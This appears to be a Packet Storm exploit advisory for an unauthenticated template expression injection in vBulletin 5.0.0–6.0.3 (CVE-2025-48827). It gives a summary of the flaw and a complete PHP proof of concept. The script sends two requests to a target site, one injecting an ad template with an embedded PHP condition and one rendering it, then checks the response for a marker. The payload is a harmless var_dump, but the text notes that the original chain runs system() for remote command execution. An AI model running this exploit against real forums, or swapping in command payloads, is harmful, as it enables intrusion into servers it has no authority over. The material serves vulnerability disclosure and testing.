@@ -1,0 +1,120 @@
+=============================================================================================================================================
+| # Title     : vBulletin 5.0.0 → 6.0.3 replaceAdTemplate Expression Injection                                                              |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.vbulletin.com/                                                                                                  |
+=============================================================================================================================================
+
+[+] Summary : 
+
+A design flaw in vBulletin's AJAX API (`ajax/api/ad/replaceAdTemplate`) allows
+unauthenticated attackers to inject arbitrary template conditions that execute
+server-side during rendering via `ajax/render/ad_<location>`.
+
+The original exploit chain enables remote command execution via `system()`
+wrapped inside template expressions. 
+
+The PoC evaluates a harmless PHP expression (`var_dump()`) inside a
+template and checks for execution by looking for a unique marker in the output.
+
+
+[+] References : ( https://packetstorm.news/files/id/200973/ 	CVE-2025-48827 ) 
+
+The flaw arises from:
+
+• Misuse of PHP Reflection in vBulletin's API dispatch.  
+• Missing access control for protected API methods.  
+• Template engine evaluating embedded PHP conditions inside `<vb:if>`.  
+• PHP 8.1+ behavior allowing direct invocation of protected methods.
+
+Two unauthenticated requests are used:
+
+1) Inject a custom ad template using `replaceAdTemplate`.  
+2) Trigger execution by calling `render/ad_<location>`.
+
+If the template condition executes, the response will contain a unique marker.
+
+
+--------------------------------------------------------------------
+### SAFE PHP POC
+--------------------------------------------------------------------
+<?php
+/*
+ * vBulletin replaceAdTemplate
+ * by Indoushka — Packet Storm Edition
+ */
+
+$target = "http://victim.com/"; // Change to target installation
+
+$marker   = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, 6);
+$location = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, 6);
+$param    = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"), 0, 6);
+
+$condition = "\"var_dump('$marker')\"";
+$template  = "<vb:if condition='$condition'></vb:if>";
+
+/* ----------------------------
+   1) Inject Template
+   ---------------------------- */
+$post1 = [
+    'routestring' => 'ajax/api/ad/replaceAdTemplate',
+    'styleid'     => '1',
+    'location'    => $location,
+    'template'    => $template
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $target);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$inj_response = curl_exec($ch);
+curl_close($ch);
+
+echo "=== Injection Response ===\n";
+echo $inj_response . "\n\n";
+
+/* ----------------------------
+   2) Trigger Execution
+   ---------------------------- */
+$trigger_value = base64_encode($marker);
+
+$post2 = [
+    'routestring' => "ajax/render/ad_$location",
+    $param        => $trigger_value
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $target);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$render_response = curl_exec($ch);
+curl_close($ch);
+
+echo "=== Trigger Response ===\n";
+echo $render_response . "\n\n";
+
+if (strpos($render_response, $marker) !== false) {
+    echo "[+] Vulnerable: Marker detected → Template executed.\n";
+} else {
+    echo "[-] Not Vulnerable.\n";
+}
+?>
+
+------------------------------------------------------------------------------
+4. Save & Run Instructions
+------------------------------------------------------------------------------
+
+Save the PoC as:
+    vb_safe_poc.php
+
+Run it using:
+    php vb_safe_poc.php
+
+If vulnerable, output includes:
+    [+] Vulnerable: Marker detected …
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
